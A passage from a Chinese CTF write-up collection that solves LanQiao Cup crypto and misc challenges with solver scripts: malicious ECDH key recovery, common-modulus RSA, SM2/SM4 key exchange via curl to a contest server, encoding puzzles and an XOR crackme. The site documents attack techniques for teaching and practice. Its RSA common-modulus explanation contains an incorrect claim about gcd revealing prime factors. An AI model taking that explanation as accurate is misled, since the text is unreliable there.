创建椭圆曲线对象E G = E.random_point() # 在椭圆曲线上随机选择一个点作为基点G k1 = getRandomNBitInteger(50) # 生成一个50位的随机整数作为私钥k1 M1 = k1 * G # 计算公钥M1 = k1 * G Y = x * G t = 1 z = (k1 - w * t) * G + (-a * k1 - b) * Y # 计算z，这是恶意的ECDH计算 k2 = sha256(str(z[0]).encode()).digest()[:6] # 根据z的x坐标生成共享密钥的前6字节 k2 = bytes_to_long(k2) M2 = k2 * G k_rec = getRandomNBitInteger(50) B_ = k_rec * G shared_key1 = k_rec * M2 # 计算发送方共享密钥 shared_key2 = k2 * B_ assert shared_key1 == shared_key2 print((w, a, b, x)) print((A, B, P)) print(G.xy()) print(M1.xy()) print(M2.xy()) print(B_.xy()) return shared_key1 def easy_enc(pt, key): key = md5(str(int(key[0])).encode()).digest() # 使用共享密钥的x坐标生成密钥 cipher = AES.new(key, AES.MODE_ECB) # 创建AES ECB模式加密对象 ct = cipher.encrypt(pad(pt, 16)) # 使用AES加密明文并填充到16字节倍数 print(ct) # 打印密文 key = Malicious_ECDH() # 执行恶意ECDH计算获取共享密钥 easy_enc(flag, key) # 使用共享密钥对明文进行AES加密 ''' 输出结果： (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' 代码流程： 1. `Get_Parameters()`函数：生成四个随机素数作为参数返回：`w, a, b, x` 2. `Malicious_ECDH()`函数：实现了一个恶意的椭圆曲线Diffie-Hellman密钥交换算法。具体流程如下： - 生成椭圆曲线参数：`P, A, B` - 随机选择曲线上的点G - 生成随机私钥k1，并计算公钥M1 = k1 * G - 生成公钥Y = x * G，随机选择比特t，计算z - 生成共享密钥k2，并计算公钥M2 = k2 * G - 随机生成k_rec作为接收方私钥，计算接收方公钥B_ - 确定共享密钥并打印输出 3. `easy_enc()`函数：使用MD5散列共享密钥的x坐标，然后使用AES ECB模式对明文进行加密，并打印输出密文。 ''' 可以看到代码使用的椭圆曲线密码加密计算key和AES加密计算flag，椭圆曲线密码（私钥加密）除了函数随机得出的key1外还计算了一个共享密钥key2，而这个key2是我们可以通过计算得出的，通过这个key2和源代码计算的加密结果ct可以计算出最终的flag。 代码如下： 注：需要安装sagemath库pip install sagemath 但经过尝试，pycharm识别不了sagemath里的这两个方法GF，EllipticCurve 所以我这里是使用sagemath的软件进行计算相关参数Sagemath下载镜像地址： 打开Sagemath notebook： 以下是sagemath代码（语法规则与python完全相同)： (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' F = GF(P) E = EllipticCurve(F, [A, B]) G=E(G) M1=E(M1) M2=E(M2) B_=E(B_) z=M1-w*G-a*x*M1-x*b*G print('z =',z) k2=276004822811606 shared_key2 = k2 * B_ print('shared_key2 =',shared_key2) ''' z = (2920789563659569373163147548402475799176312294208007526555549238616116689537016760237807061726607670926891615111013956193007747857795096909984003496048581 : 10517297501880005702839316775363523598197119104340092276316129735895299215931339984161377716927383514544697252095888746635319905909087037545258917591357583 : 1) shared_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895 : 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378 : 1) ''' 将sagemath得到的两个元组变量中的：改为,，放入python中使用，达到python代码： from Crypto.Util.number import * from Crypto.Util.Padding import pad from random import randint from Crypto.Util.strxor import strxor from Crypto.Cipher import AES from hashlib import sha256 from hashlib import md5 import sagemath (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' # z变量在sagemath中得到 z = (2920789563659569373163147548402475799176312294208007526555549238616116689537016760237807061726607670926891615111013956193007747857795096909984003496048581, 10517297501880005702839316775363523598197119104340092276316129735895299215931339984161377716927383514544697252095888746635319905909087037545258917591357583, 1) # shared_key2变量在sagemath中得到 shared_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895, 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378, 1) k2 = sha256(str(z).encode()).digest()[:6] k2 = bytes_to_long(k2) print(f'k2 = {k2}') # shared_key2 = k2 * B_ print(f'saged_key2 = {shared_key2}') # AES解密过程 key = md5(str(int(shared_key2[0])).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ct = cipher.decrypt(ct) print(f'flag = {ct}') ''' k2 = 5364609264917 saged_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895, 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378, 1) flag = b'flag{63259ab8-4916-4095-8888-d92c2b003e18}\\x06\\x06\\x06\\x06\\x06\\x06' ''' 代码中出一些变量外，其他代码几乎就是原版照抄！！！ sagemath代码中的z变量表达式就是题目源代码括号拆开带入`M1=k1G`* 最终得到flag：flag{63259ab8-4916-4095-8888-d92c2b003e18} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/classical.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/classical.html","title":"Classical","keywords":"","body":"题目描述 classical 解题 下载附件，得到密文： Ld hcrakewcfaxr, f hofjjlhfo hlaxuc lj f krau ev hlaxuc kxfk zfj tjui xljkeclhfoor gtk dez xfj vfooud, vec kxu pejk afck, ldke iljtju. Ld hedkcfjk ke peiucd hcrakewcfaxlh foweclkxpj, pejk hofjjlhfo hlaxucj hfd gu acfhklhfoor hepatkui fdi jeoyui gr xfdi. Xezuyuc, OrmkO3vydJCoe2qyNLmcN2qlpJXnM3SxM2Xke3q9 kxur fcu foje tjtfoor yucr jlpaou ke gcufn zlkx peiucd kuhxdeoewr. Kxu kucp ldhotiuj kxu jlpaou jrjkupj tjui jldhu Wcuun fdi Cepfd klpuj, kxu uofgecfku Cudfljjfdhu hlaxucj, Zecoi Zfc LL hcrakewcfaxr jthx fj kxu Udlwpf pfhxldu fdi guredi. F btlhn gcezd veq mtpa eyuc kxu ofsr iew. 看起来没什么规律，查看题目叫经典，猜测与古典密码有关，经过常见古典密码对比，有可能是字母频率分析： 字母频率分析 得到明文： In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog. 翻译： 在密码学中，经典密码是历史上使用过的一种密码，但现在大部分已经废弃了。与现代密码算法相比，大多数经典密码可以实际计算和手工求解。然而，LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9它们通常也很容易与现代技术相突破。这个术语包括自希腊和罗马时代以来使用的简单系统，文艺复兴时期精心设计的密码，第二次世界大战期间的密码学，如Enigma机器等。一只敏捷的棕色狐狸跳过了那只懒狗。 猜测flag就在文本中的字符串LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9中， 根据经验，题目无其他信息，先进行移位， 未发现变化，然后再加上base64： 发现在移位=14时可以用base64解出flag： 或者使用CyberChef的魔法棒功能也能解出： 点击得到flag flag{classical_cipher_so_easy} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.html","title":"Cyber Chef","keywords":"","body":"题目描述 CyberChef是一款开源的编码转换器，它可以在web浏览器中轻松完成各种网络操作，例如加解密、压缩、散列、解析等。它不仅可以帮助你分析和解密数据，还可以用于反混淆恶意脚本。小蓝同学把他在CyberChef中的操作步骤保存为静态网页，并把原始的flag删除了，你能解密出来吗？ 解题 下载附件是一个CyberChef网页： 可以看到先是进行了base64加密，然后进行了ROT13移位 ROT13简介 ROT13（回转13位）是一种简易的替换式密码算法。它是一种在英文网络论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。 ROT13 也是过去在古罗马开发的凯撒密码的一种变体。 ROT13是它自身的逆反，即：要还原成原文只要使用同一算法即可得，故同样的操作可用于加密与解密。该算法并没有提供真正密码学上的保全，故它不应该被用于需要保全的用途上。它常常被当作弱加密示例的典型。 应用ROT13到一段文字上仅仅只需要检查字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。A换成N、B换成O、依此类推到M换成Z，然后串行反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里的字符受影响；数字、符号、空白字符以及所有其他字符都不变。替换后的字母大小写保持不变。 所以我们只要实现该加密的逆过程就行： ROT13逆过程需要改变偏移量为26-3=23： 得到flag{dcb77abc-6445-4840-bbca-5252f60735e7} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.html","title":"Cyber Chef 2","keywords":"","body":"题目描述 小蓝同学把他在CyberChef中的操作步骤保存为静态网页，并把原始的flag删除了，还把DES的iv值隐去了6个字节，你能解密出来吗？ 解题 下载附件，打开网页： 可以看到题目先进行了AES加密，再进行了DES加密，并且两种加密都使用了CBC填充和iv值： 在CBC（不光是DES算法）模式下，iv通过随机数（或伪随机）机制产生是一种比较常见的方法。iv的作用主要是用于产生密文的第一个block，以使最终生成的密文产生差异（明文相同的情况下），使密码攻击变得更为困难，除此之外iv并无其它用途。 最大的好处是，即使相同的明文，相同的密钥，也能产生不同的密文。 进行逆过程，可以看到出题人让我们看到了一部分的flag， 出现上述现象，是因为CBC模式在加密时，只会使用向量iv与第一个明文分组进行异或、加密得到第一组密文，从第二组之后的每一次操作都将前一组密文与明文进行异或、加密，得到密文； 但是DES的iv值我们并不知道，但根据规律可以才出iv=010x0x0x： 题目看似无解，但是在我们修改iv值时，发现只有在iv最后一位为8或9的时候，网页输出会有所不同，所以我们大胆猜测直接通过爆破的方式解题， 从最后一位开始往上猜测iv的值 最终得到正确的iv=01070309。 得到flag{8a860a81-0370-42be-9b7d-78208c5d1f9c} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.html","title":"RSA","keywords":"","body":"题目描述 某公司为了保护其重要数据，使用了RSA加密算法。该公司以同一个N 为模数，为Alice和Bob分别生成了不同的公钥和与之相应的私钥。Alice 和Bob都使用自己的公钥对同一条明文m进行加密，分别得到密文c 1和c 2。假设你是一名密码安全研究者， 你获取了N值、两个密文和公钥， 能否使用RSA的相关知识还原出明文m呢? 分析题目 分析题目，已知n值，两个密文和公钥，根据题目描述和积累，判断该题为RSA的公模攻击（以下内容摘抄自互联网） ​ 所谓共模攻击指的是在针对多个RSA密钥，它们所使用的模数是相同的情况下，通过求数学关系来破解其中的某个密钥。 在实际应用中，由于性能和时间成本的原因，使用相同的模数往往是必要的。这种情况下，RSA密钥中的指数d和e必须满足d×e=1 mod φ(n)，其中φ(n)是n的欧拉函数。攻击者可以通过计算求解d或e，从而轻松破解RSA加密。 具体来说，共模攻击流程如下： 攻击者获得两个或多个RSA公钥，它们共用相同的模数n。 攻击者选取一个消息m，并对其进行加密，得到密文c1=m^e1 mod n和c2=m^e2 mod n，其中e1和e2分别是两个公钥中的指数。 攻击者寻找模数n和两个指数e1和e2的最大公约数gcd(e1,e2)，并将其命名为g。 如果g不等于1，则说明攻击者找到了至少一个质因数p或q，并可以用它来推导RSA私钥中的指数d。 通过继续计算，攻击者可以确定私钥中的指数d，并从而获得原始消息m。 先打开文件 根据代码已知两个输出的密文，两个公钥e1，e2（e1可以更具random种子重现得知），n值 由此写出结题程序，得到flag{359a1693-7bce-4fbc-87fa-111cdffaa0e8} from Crypto.Util.number import * import gmpy2 import random random.seed(123456) c1 = 3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363 c2 = 1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120 n = 7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957 # e1 = random.randint(100000000, 999999999) # print(e1) e1 = 965035544 e2 = 65537 _, r, s = gmpy2.gcdext(e1, e2) # 拓展的欧几里得 m = pow(c1, r, n) * pow(c2, s, n) % n # 有数学逻辑在里面，咱也不知道，咱也不敢问，反正以后的共模攻击就用这个代码 print(long_to_bytes(m)) 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.html","title":"基于国密SM2算法的密钥密文分发","keywords":"","body":"题目描述 完整题目背景及描述请见附件。 补充说明：如成功完成题目，flag会显示在/api/search返回的 json中，如果使用工具发包卡顿，可尝试使用 curl发送数据包 （本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ；本题启动慢，请静待一会） 分析 根据题目给的附件，按照步骤进行操作： 选手上传身份信息（姓名、学校、手机）；/api/login 查询选手id并记录；/api/login 选手生成密钥对A(公钥A_Public_Key、私钥A_Private_Key)，将密钥对A的公钥(A_Public_Key)传输给服务器；/api/allkey 服务器使用国密SM2算法生成密钥对B(公钥B_Public_Key、私钥B_Private_Key)， 使用量子随机数发生器产生16字节随机数C； 服务器首先使用16字节随机数C对私钥B_Private_Key采用SM4ECB算法加密得到私钥B_Private_Key密文； 然后使用A_Public_Key对16字节随机数C进行SM2加密得到随机数C密文。 选手查询服务器信息，并记录；/api/allkey 选手公钥sm2加密后的随机数c密文； 服务端公钥； 随机数c明文sm4加密后的服务端私钥B_Private_Key密文。 选手使用私钥A_Private_Key，对随机数C密文进行SM2解密，获取16字节随机数C明文；用户使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密，得到私钥B_Private_Key明文； 选手向服务器请求密钥，服务器使用公钥B_Public_Key明文，对密钥D(16字节)采用SM2算法加密，将密钥D密文传输给用户 选手使用私钥B_Private_Key明文，对密钥D密文进行解密，得到密钥D明文；/api/quantum 选手将密钥D明文，上报至服务器进行验证，服务器返回参赛结果；/api/check 选手信息查询得到flag。/api/search 信息记录 姓名=niupi 学校=niupidaxue 手机=12345678910 选手公钥A_Public_Key=DAD51C9B4DF2A908089F937C6CD73673F6790070D01939ED14CBEA20A5167531294D538BE319EE11251D7B38F9653E13FF2568C7D6220D38840961F22263C780 选手私钥A_Private_Key=E3BF24F92C062BA1ED1D5933E56E318FC09569098C86DAC0869977B6EA4F3B13 id=2accc84c-80d1-4d3d-836d-14f6ba4d77e6 服务器私钥B_Private_Key密文=d50019466dbdccfcb3aaf42d6e993a100791c3fdab7d2f784e8a2a1cad58251e 服务器随机数C密文=0d48274b3262eeab1b97223aa54e953a8559d616b03a4d23965d75fabb000613d0ba4cc4070cc28b51ebb82c69378f84d05705cadef255a3bf94a9162c216a7c44f919b523bc3316872bbc53f16594e80725cdf4d4f72e0646f0393449986a7a2fc406a4c324fe39f48097df559dcdcd 服务器公钥B_Public_Key明文=04a2220267bb03f2481d6eb6e5d2fb201f39018ce4ab7017cd9eb385d953eeea8c56e6850ed64050ab8ea35e047601b9e292ffa7a8ba0ac3702c946ea705f0fdd8 服务器私钥B_Private_Key明文= 服务器随机数C明文= 密钥D密文= 密钥D明文= 解题 题目IP：http://39.106.48.123:32818 一、上传信息 curl -d \"name=niupi&school=niupidaxue&phone=12345678910\" http://39.106.48.123:32818/api/login id=2accc84c-80d1-4d3d-836d-14f6ba4d77e6 二、上传选手公钥A、获取密钥密文 curl -d \"id=2accc84c-80d1-4d3d-836d-14f6ba4d77e6&PublicKey=DAD51C9B4DF2A908089F937C6CD73673F6790070D01939ED14CBEA20A5167531294D538BE319EE11251D7B38F9653E13FF2568C7D6220D38840961F22263C780\" http://39.106.48.123:32818/api/allkey 服务器私钥B_Private_Key密文：d50019466dbdccfcb3aaf42d6e993a100791c3fdab7d2f784e8a2a1cad58251e 服务器随机数C密文：0d48274b3262eeab1b97223aa54e953a8559d616b03a4d23965d75fabb000613d0ba4cc4070cc28b51ebb82c69378f84d05705cadef255a3bf94a9162c216a7c44f919b523bc3316872bbc53f16594e80725cdf4d4f72e0646f0393449986a7a2fc406a4c324fe39f48097df559dcdcd 服务器公钥B_Public_Key明文：04a2220267bb03f2481d6eb6e5d2fb201f39018ce4ab7017cd9eb385d953eeea8c56e6850ed64050ab8ea35e047601b9e292ffa7a8ba0ac3702c946ea705f0fdd8 密钥密文： curl -d \"id=2accc84c-80d1-4d3d-836d-14f6ba4d77e6\" http://39.106.48.123:32818/api/quantum 密钥密文：fb1a4c69bf1af4699fda1ce7377b5f27cc0176dd307a0e5feffc7899202049825903da6ded6a8382fa157f4db5e16feb2493808fa3634acf766d8345620c8ba4c43d64d563cbbd605eb6de5caaf10537b8747037903fb676805babd1d05171fdd030f1ef90043d4fc14f9b8561580629 三、处理得到的密文信息 用选手私钥通过SM2算法解密随机数C： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/58与64.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/58与64.html","title":"58与64","keywords":"","body":"题目描述 好多文件..得想办法把他们弄在一起 下载附件查看文件，可以看到一共14267个文件 错误思路 根据题意将他们合并 合并文件脚本（注意是shell脚本，需在linux环境运行），合并后文件为book #!/bin/bash # 循环遍历0-14267的文件名，并逐个合并到book.txt中 for i in {0..14267}; do file=\"${i}.txt\" # 将文件序号转为3位数的文件名，如1.txt、2.txt、...、999.txt if [ -f $file ]; then # 检查文件是否存在 cat $file >> book # 使用cat命令将当前文件内容追加到文件book中 echo \"合并成功: $file\" else echo \"文件不存在: $file\" fi done echo \"合并完成！\" 将合并后的文件中的数据进行base58解码，然后循环进行base64解码，代码如下： import base64 import base58 c = ... # 字符串太大 str58 = '' for i in range(0, len(c)): data = base58.base58_decode(c[i]) str58 += data while True: str58 = base64.b64decode(str58) print(str58) 运行后可以看到报错显示为填充不正确，猜测是base58解码后的字符串不符合进行base64填充解码的条件。 正确思路 将14267个文件中的内容分别进行base58解码，将得到的字符串再进行循环base64解码，到最后得到flag，代码如下： import base58 import base64 flag = '' for i in range(0, 14268): f = open(f'D:/ctfbase/lanqiao/Misc/58与64/{i}.txt').read() data = base58.base58_decode(f) flag += data while True: try: flag = base64.b64decode(flag) print(flag) except: exit() 运行后得到flag{640ce012-3d3a-446d-9d0e-5d2fe840063b} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.html","title":"AdvDetPatch（未完成）","keywords":"","body":"题目描述 目标检测技术广泛应用于视频监控、智能驾驶等安全关键型领域，因此 检验目标检测模型的脆弱性至关重要。对抗补J攻击通过修改图像的局 部区域来达到欺骗目标检测模型的目的，是最实用的攻击方法之一。在 现实世界中，攻击者可以在路牌上贴上精心设计的贴纸或者制作具有补 1 J图案的衣服来欺骗目标检测器。本题目考虑对目标检测模型的对抗 补丁攻击，要求选手通过添加补J使检测框消失，避开检测，同时要求 修改的图像区域尽可能小。为实现这一目标， 补J的形状、位置、纹理 等都是需要考虑的因素。 (请点击“下发赛题” 本题容器下发后的端是ssh端口，ssh的账号为ctf,密 码为gamelab ; ssh登录上去可自行修改密码。请仔细阅读/home/ctf/README. md文件以及源代码文件) 解题 按照题目要求登录服务器 查看文件README.md 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.html","title":"Blue Monday","keywords":"","body":"题目描述 Those who came before me lived through their vocations From the past until completion, they'll turn away no more And still I find it so hard to say what I need to say But I'm quite sure that you'll tell me just how I should feel today. blue_monday 解题 下载附件，得到一个文件，用winhex打开查看flag痕迹： 发现有很多d乗€将前几个文本字符连接起来发现关键词IceCTF; 据此将所有字符连接得到flag：IceCTF{HAck1n9_mU5Ic_W17h_mID15_L3t5_H4vE_a_r4v3} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.html","title":"Classica 10","keywords":"","body":"题目描述 听说神盾局的网络被日穿之后，有人从里面挖出来一个神秘的文件咋一看也没什么，可是这可是class10保密等级的哦，里面一定暗藏玄机，你能发现其中暗藏的玄机吗？ 解题 下载附件，得到一个未知后缀文件，用winhex打开， 查看头尾，猜测可能是png图片，修改文件头： 改为 更改后缀为png得到图片： 输入flag发现不对，继续观察， 使用Stegsolve提取数据并未发现问题， 再次使用binwalk查看是否具有隐藏文件： 提取出来得到文件： binwalk -Me class10\\ -\\ 副本.png 查看文件F4289内容发现是一系列01数据， 搜索后猜测可能是二维码， 编写脚本，复原二维码： from PIL import Image MAX = 29 pic = Image.new(\"RGB\", (MAX, MAX)) with open(\"D:/ctfbase/LanQiao/Misc/Class10/_class10.png.extracted/F4289\", \"r\") as f: data = f.read() i = 0 for y in range(0, MAX): for x in range(0, MAX): if data[i] == '1': pic.putpixel([x, y], (0, 0, 0)) else: pic.putpixel([x, y], (255, 255, 255)) i += 1 pic.show() pic.save(\"D:/ctfbase/LanQiao/Misc/Class10/flag.png\") 得到二维码： 使用QR_Research扫描得到：PCTF{e32f2543fd5e246272eb7d15cc72a8ec} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.html","title":"Easy Crack Me","keywords":"","body":"题目描述 都说逆向挺难的，但是这题挺容易，反正我不会，大家来挑战一下吧~~:) 文件：点击下载附件 解题 下载附件，得到一个elf文件，放入exeinfope查看，是64位， 放入IDA反汇编，报错得到偏移量过大，但是可以不用管， 继续找到关键字： 双击进入，Ctrl+X交叉引用找到主程序： 大概就是要求我们输入值也就是flag；并且知道flag为26位 再将输入的值的第一位与0xAB异或与byte_6B41D0比较； 然后再将输入的其他值与地址在v21变量出的数组进行取模6的异或，与byte_6B41D1数组比较； 相同则返回正确 所以我们需要找到v21变量地址处的值与byte_6B41D1的30位值 byte_6B41D1值 点击byte_6B41D1进入找到值，但是导出时发现只有21位： 在想到文件打开时具有地址偏移，猜测影响到了该变量，将byte_6B41D1上方的qword_6B41C7变量一起导出再去掉变量结尾的0，发现刚好30位，但是变量开始有一串0，再想到flag是26位，于是去掉开始的0得到26位数据： unsigned char ida_chars[] = { /*0x00, 0x00, 0x00, 0x00, */ 0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B, 0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0 }; v21数组 在伪代码中查看，发现并不能找到该变量的值，于是返回查看汇编代码，找到异或代码引用的地方： 一步步跟踪，发现rsp+rcx寄存器中存储了该值，往上找到6个数据，得到数据， 提取出来，注意取值是应从高位到低位： int xor_data[] = {0xAB, 0xDD, 0x33, 0x54, 0x35, 0xEF}; 由此写出exp： ida_chars = [ 0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B, 0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0] xor_data = [0xAB, 0xDD, 0x33, 0x54, 0x35, 0xEF] flag = \"\" for i in range(0, 26): flag += chr(xor_data[i % 6] ^ ida_chars[i]) print(flag) # PCTF{r3v3Rse_i5_v3ry_eAsy} 运行得到flag：PCTF{r3v3Rse_i5_v3ry_eAsy} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.html","title":"Embarrass","keywords":"","body":"题目描述 embarrass 解题 解题方式与find_the_flag相同 下载附件，查看流量包未发现关键信息，使用010editor打开搜索flag关键字，在查看中选择编辑为文本 